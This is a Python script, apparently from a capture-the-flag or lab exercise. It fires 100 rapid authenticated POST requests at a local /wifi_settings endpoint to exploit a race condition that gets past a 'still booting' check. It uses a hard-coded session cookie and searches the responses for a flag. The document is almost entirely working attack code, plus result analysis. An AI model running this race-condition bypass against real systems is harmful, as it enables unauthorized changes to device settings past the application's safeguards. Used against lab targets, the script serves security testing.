import requests
import time
import statistics
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

# Target configuration
url = "http://127.0.0.1:32992/wifi_settings"
cookies = {"session": "ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8"}
data = {"ssid": "TestRace", "password": "race1234"}

# Create session with connection pooling for faster requests
session = requests.Session()
adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=0)
session.mount('http://', adapter)

num_requests = 100

print(f"[=] Starting race condition test...")
print(f"[=] Target URL: {url}")
print(f"[=] Number of rapid requests: {num_requests}")
print(f"[=] Start time: {time.strftime('%H:%M:%S')}")

results = []
start_all = time.perf_counter()

# Send requests as fast as possible in a tight loop
for i in range(num_requests):
    req_start = time.perf_counter()
    try:
        response = session.post(
            url,
            cookies=cookies,
            data=data,
            timeout=10,
            allow_redirects=False
        )
        req_end = time.perf_counter()
        elapsed_ms = (req_end - req_start) * 1000
        
        result = {
            "id": i,
            "status": response.status_code,
            "body": response.text,
            "time_ms": elapsed_ms,
            "contains_booting_error": "still booting" in response.text.lower()
        }
        results.append(result)
        
    except Exception as e:
        req_end = time.perf_counter()
        elapsed_ms = (req_end - req_start) * 1000
        results.append({
            "id": i,
            "status": None,
            "error": str(e),
            "time_ms": elapsed_ms,
            "contains_booting_error": False
        })

end_all = time.perf_counter()
total_time = end_all - start_all

print(f"[+] All requests completed in {total_time:.3f} seconds")
print(f"[+] Average time per request: {(total_time/num_requests)*1000:.2f} ms")
print(f"[+] End time: {time.strftime('%H:%M:%S')}")

# Analyze results
print("\n" + "="*60)
print("RACE CONDITION TEST RESULTS")
print("="*60)

# Group results by outcome
success_responses = [r for r in results if r['status'] == 200 and not r.get('contains_booting_error', False)]
booting_errors = [r for r in results if r.get('contains_booting_error', False)]
other_errors = [r for r in results if r['status'] is not None and r['status'] != 200 and not r.get('contains_booting_error', False)]
connection_errors = [r for r in results if 'error' in r and r['error'] is not None]

print(f"\n[SUMMARY]")
print(f"  Total requests sent: {num_requests}")
print(f"  Successful responses (no booting error): {len(success_responses)}")
print(f"  Booting errors ('still booting'): {len(booting_errors)}")
print(f"  Other HTTP errors: {len(other_errors)}")
print(f"  Connection errors: {len(connection_errors)}")

# Timing analysis
response_times = [r['time_ms'] for r in results if 'time_ms' in r]
if response_times:
    print(f"\n[TIMING ANALYSIS]")
    print(f"  Min response time: {min(response_times):.2f} ms")
    print(f"  Max response time: {max(response_times):.2f} ms")
    print(f"  Mean response time: {statistics.mean(response_times):.2f} ms")
    print(f"  Median response time: {statistics.median(response_times):.2f} ms")
    if len(response_times) > 1:
        print(f"  Stdev: {statistics.stdev(response_times):.2f} ms")
    
    # Find timing anomalies
    mean_time = statistics.mean(response_times)
    std_time = statistics.stdev(response_times) if len(response_times) > 1 else 0
    if std_time > 0:
        anomalies = [r for r in results if abs(r['time_ms'] - mean_time) > 2 * std_time and 'body' in r]
        if anomalies:
            print(f"\n  [!] Timing anomalies (±2 std dev): {len(anomalies)} requests")
            for r in anomalies[:3]:
                print(f"      Request #{r['id']}: {r['time_ms']:.2f}ms (diff: {r['time_ms'] - mean_time:+.2f}ms)")

# Boot state bypass analysis
print(f"\n[BOOT STATE BYPASS ANALYSIS]")
non_booting_responses = [r for r in results if not r.get('contains_booting_error', False) and 'body' in r]
if non_booting_responses:
    print(f"  [!] FOUND {len(non_booting_responses)} responses WITHOUT 'still booting' error!")
    for r in non_booting_responses[:5]:
        print(f"\n      Request #{r['id']}:")
        print(f"      Status: {r['status']}")
        print(f"      Time: {r['time_ms']:.2f}ms")
        body_preview = r['body'][:400].replace('\n', ' ')
        print(f"      Body: {body_preview}")
else:
    print(f"  [-] All responses contained the booting error message")

# Check for unique error messages
print(f"\n[ERROR MESSAGE VARIATIONS]")
unique_bodies = set()
for r in results:
    if 'body' in r and r['body']:
        unique_bodies.add(r['body'][:350])

print(f"  Found {len(unique_bodies)} unique response bodies")
if unique_bodies:
    for i, body in enumerate(list(unique_bodies)[:3], 1):
        print(f"\n  Pattern {i}:")
        print(f"  {body}")

# Search for interesting patterns
print(f"\n[CONTENT ANALYSIS]")
interesting_patterns = {
    'flag': [],
    'success': [],
    'updated': [],
    'saved': [],
    'error': [],
    'failure': []
}

for r in results:
    if 'body' in r:
        body_lower = r['body'].lower()
        for pattern in interesting_patterns:
            if pattern in body_lower:
                interesting_patterns[pattern].append(r)

for pattern, matches in interesting_patterns.items():
    if matches:
        print(f"  Found '{pattern}' in {len(matches)} responses")
        if pattern == 'flag':
            for r in matches[:3]:
                print(f"    [!] Request #{r['id']}: {r['body'][:300]}")

# Status code distribution
status_codes = {}
for r in results:
    status = r.get('status')
    if status is not None:
        status_codes[status] = status_codes.get(status, 0) + 1

print(f"\n[STATUS CODE DISTRIBUTION]")
for status, count in sorted(status_codes.items()):
    pct = (count / num_requests) * 100
    print(f"  Status {status}: {count} responses ({pct:.1f}%)")

# Show first booting error response for comparison
if booting_errors:
    print(f"\n[SAMPLE BOOTING ERROR (Request #{booting_errors[0]['id']})]")
    print(f"  {booting_errors[0]['body']}")

# Show any non-booting response
if non_booting_responses:
    print(f"\n[!] NON-BOOTING RESPONSES (POSSIBLE BYPASS)")
    for r in non_booting_responses[:3]:
        print(f"\n  Request #{r['id']}:")
        print(f"  Full Response: {r['body']}")
        print(f"  Status: {r['status']}, Time: {r['time_ms']:.2f}ms")

